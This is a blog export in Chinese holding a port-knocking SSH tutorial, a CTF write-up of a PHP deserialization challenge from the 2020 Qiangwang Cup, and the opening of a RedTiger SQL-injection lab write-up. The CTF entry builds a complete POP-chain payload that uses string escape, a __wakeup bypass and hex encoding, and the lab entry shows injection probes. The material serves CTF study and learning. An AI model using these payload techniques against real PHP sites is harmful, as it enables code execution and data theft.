<p>修改完成之后，保存并退出，然后启动 knockd 服务 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service knockd start</span><br></pre></td></tr></table></figure></p>
<p>解释：上述命令的意思就是如果依次访问 7000,8000,9000 就允许其访问 22 端口；如果它依次访问 9000,8000,7000 ，则再次关闭 22 端口。</p>
<h1 id="远程访问测试">3. 远程访问测试</h1>
<p>远程主机上查看 22 端口还是处于 filtered 状态</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514205254.png" /></p>
<p>我们依次访问 7000,8000,9000 端口 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 7000 10.0.2.21</span><br><span class="line">2. nmap -p 8000 10.0.2.21</span><br><span class="line">3. nmap -p 9000 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210433.png" /></p>
<p>然后再次查看 22 端口</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210127.png" /></p>
<p>依次访问： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 9000 10.0.2.21</span><br><span class="line">2. nmap -p 8000 10.0.2.21</span><br><span class="line">3. nmap -p 7000 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210414.png" /></p>
<p>22 端口就会关闭</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514210401.png" /></p>
<h1 id="总结">4. 总结</h1>
<p>这个方法还是挺有意思的，像是“芝麻开门”。只要访问序列够复杂，爆破的难度就会很大。</p>
<h1 id="参考">5. 参考</h1>
<ol type="1">
<li><a href="https://www.rapid7.com/blog/post/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/">How to Secure SSH Server using Port Knocking on Ubuntu Linux | Rapid7 Blog</a></li>
<li><a href="https://wohin.me/zhi-ma-kai-men-de-mi-mi-port-knocking/">芝麻开门的秘密：Port Knocking</a></li>
</ol>
]]></content>
      <categories>
        <category>Port Knocking</category>
      </categories>
      <tags>
        <tag>Port Knocking</tag>
      </tags>
  </entry>
  <entry>
    <title>POP链</title>
    <url>/2022/04/15/POP%E9%93%BE/</url>
    <content><![CDATA[<p>个人知识点记录。</p>
<span id="more"></span>
<h1 id="魔术方法">魔术方法</h1>
<p>可以参考一下：[[反序列化知识点#2 常见的魔术方法|常见魔术方法]]</p>
<p>常见的魔术方法是构造POP链得到关键！</p>
<h1 id="寻找pop链">寻找POP链</h1>
<p>POP链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的POP链就显而易见了。CTF赛中一般尾部就是get flag的方法，头部则是GET/POST传参。</p>
<p>题目：2020强网杯-Web辅助</p>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123; <span class="comment"># gettype()获取变量类型</span></span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;name; </span><br><span class="line">            <span class="variable">$name</span>(); <span class="comment"># 可以触发 __invoke()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment"># 当程序结束时，自动执行这个（存在该类对象），从而调用TP（）</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123; <span class="comment"># stristr() 搜索字符串在另一字符串中的第一次出现,this-&gt;name被当作字符串，从而触发__toString()</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>); <span class="comment"># POP链尾部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; <span class="comment"># 调用这个魔术方法从而调用KS()得到flag</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;KS();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&#x27;\0*\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>); <span class="comment"># protected和private的属性被序列化时必须包含\0。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==<span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>); <span class="comment"># POP链头部</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>))); </span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// play.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line">print_r(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;get_admin() === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先看index.php文件，里面的<code>$player = new player($username, $password);</code>构成了POP链的头部。然后看<code>class.php</code>，首先注意到<code>system("cat /flag");</code>，这就是POP链的尾部。接下来就从尾到头把POP链寻找出来：</p>
<ol type="1">
<li><p>要想执行<code>system("cat /flag");</code>，必须调用<code>jungle</code>类中的<code>KS()</code>方法，在同一个类中，存在着一个<code>__toString()</code>的魔术方法正好调用了<code>KS()</code>。</p></li>
<li><p>接下来需要找到哪里能够调用<code>__toString()</code>，当<code>jungle</code>类被当作字符串时，就会执行该魔术方法。<code>midsolo</code>类中的<code>stristr($this-&gt;name, 'Yasuo')</code>，如果<code>this_name</code>为<code>jungle</code>，则能够触发<code>__toString()</code>。因此，接下来需要寻找如何调用<code>midsolo</code>类中的<code>Gank()</code>方法。</p></li>
<li><p><code>midsolo</code>类中的<code>Gank()</code>方法被同一类中的<code>__invoke()</code>魔术方法调用，当<code>midsolo</code>类被当作函数执行的时候，就会自动调用该魔术方法。而<code>topsolo</code>类中的<code>TP()</code>方法中的<code>$name();</code>能够将类当作函数执行，只需要将该类中的<code>$name</code>设置为<code>midsolo</code>即可。而<code>TP()</code>方法被<code>__destruct()</code>魔术方法调用，也就是当程序结束时，如果创建过<code>topsolo</code>类对象，则会自动调用<code>__destruct()</code>魔术方法，从而直接顺着POP链get flag。</p></li>
<li><p>POP链到这就出现了断层，那就是我们传入的是<code>player</code>类，而不是<code>topsolo</code>类，现在需要思考的就是如何从一个类跳到另一个类！这里就涉及到<strong>反序列化字符串逃逸</strong>！</p></li>
<li><p>将思路整理如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建topsolo类对象，结束时触发__destruct，调用TP </span><br><span class="line">--&gt; TP中的$name()调用__invoke，从而调用Gank </span><br><span class="line">--&gt; Gank中的stristr调用了__toString，从而调用了KS，并执行system(&#x27;cat /flag&#x27;)</span><br><span class="line">--&gt; 输出flag，结束</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="构造payload">构造payload</h1>
<hr />
<p>复现环境：</p>
<ul>
<li>Windows11</li>
<li>phpstudy2018</li>
<li><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144817.png" /></li>
</ul>
<p>注意：版本不能太低，否则有的魔术方法不会生效。如果跟我一样，就需要把<code>system(cat /flag)</code>稍作修改。</p>
<hr />
<p>然后进行代码审计，整体过程简化如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$player</span> = <span class="keyword">new</span> player(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), write(serialize(<span class="variable">$player</span>)));</span><br><span class="line">@<span class="variable">$player</span> = unserialize(read(check(file_get_contents(<span class="string">&quot;caches/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br></pre></td></tr></table></figure></p>
<p>注意到过程中有三个函数<code>read</code>，<code>write</code>，<code>check</code>，在序列化时，调用<code>write</code>函数<code>$data = str_replace(chr(0)."*".chr(0), '\0*\0', $data);</code>将3个字符变成5个字节；然后在反序列化时，调用<code>read</code>函数<code>$data = str_replace('\0*\0', chr(0)."*".chr(0), $data);</code>，将5个字节变为3个字节。</p>
<p>生成password中需要传入的topsolo的序列化后的字符串代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle;  </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> topsolo(<span class="variable">$b</span>); <span class="comment"># 触发__invoke</span></span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125; <span class="comment"># *号前后还有看不见的\0，%00是\0经过url编码的结果</span></span><br></pre></td></tr></table></figure></p>
<p>修改midsolo类属性个数绕过<code>__wakeup</code>，修改name属性为16进制，并且需要把小写的s改为大写S绕过<code>check</code>函数 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC: O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;%00*%00nam\65&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>生成一个正常的player类的序列化字符串： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;hdf&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="string">&#x27;sdfsdfsdfsdfsdfsdfsdfasdfasddfasfewafs&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> player(<span class="string">&#x27;hdf&#x27;</span>，<span class="string">&#x27;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要把<code>O:7:"topsolo"......:7:"Lee Sin";&#125;&#125;&#125;</code>字符串放到<code>pass</code>属性中，也就是如下：（为了方便，我做了分行，<code>[]</code>中的内容是原来没有，我添加的） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;</span><br><span class="line">s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;hdf&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;s:<span class="number">127</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">[;s:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>pass<span class="string">&quot;;]O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:2:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>%<span class="number">00</span>*%<span class="number">00</span>nam\<span class="number">65</span><span class="string">&quot;;s:7:&quot;</span>Lee Sin<span class="string">&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出，<code>user</code>的值应该为<code>hdf";s:7:"%00*%00pass";s:127:</code>，除了本身的<code>hdf</code>还需要包含22个字符，每个read都会减少2个字符，因此需要read 11次，也就是<code>username</code>应该为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</span><br></pre></td></tr></table></figure></p>
<p>那么password就该为（把方框的内容添上）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=hdf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00nam\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00nam\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>admin</code>无所谓，不影响结果。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144241.png" /></p>
<p>然后访问<code>play.php</code>文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220415144222.png" /></p>
<p>这里我将<code>system(cat /flag)</code>改为<code>echo('you get the flag!!!')</code>，因为复现的主机是Windows，并且不存在flag文件。</p>
<p>当然还有许多构造payload的方法，不过都是大同小异。本题考察的知识点非常的多，几乎涉及了PHP反序列化的所有知识点，字符串逃逸、POP链、进制绕过、魔术方法绕过</p>
<h1 id="相关题目">相关题目</h1>
<ol type="1">
<li>POP链简单应用：[[MRCTF2020 Ezpop]]</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
        <tag>POP链</tag>
      </tags>
  </entry>
  <entry>
    <title>Redtiger_Hackit_WriteUp</title>
    <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
    <content><![CDATA[<p>网站：https://redtiger.labs.overthewire.org/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png" /></p>
<span id="more"></span>
<h1 id="level-1">Level-1</h1>
<h2 id="题目描述">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152754.png" /></p>
<p>点击 <code>1</code> 发现 url 出现 <code>cat=1</code> ，并且页面出现了一些变化 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318152853.png" /></p>
<p>url: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1</span><br></pre></td></tr></table></figure></p>
<h2 id="测试注入点">测试注入点</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=1=1</span><br><span class="line">?cat=1=2</span><br></pre></td></tr></table></figure>
<p>如上 payload，后者出现 <code>This category does not exist!</code>，而前者正常，说明存在注入点，并且为数字型，即没有闭合方式。</p>
<h2 id="注入过程">注入过程</h2>
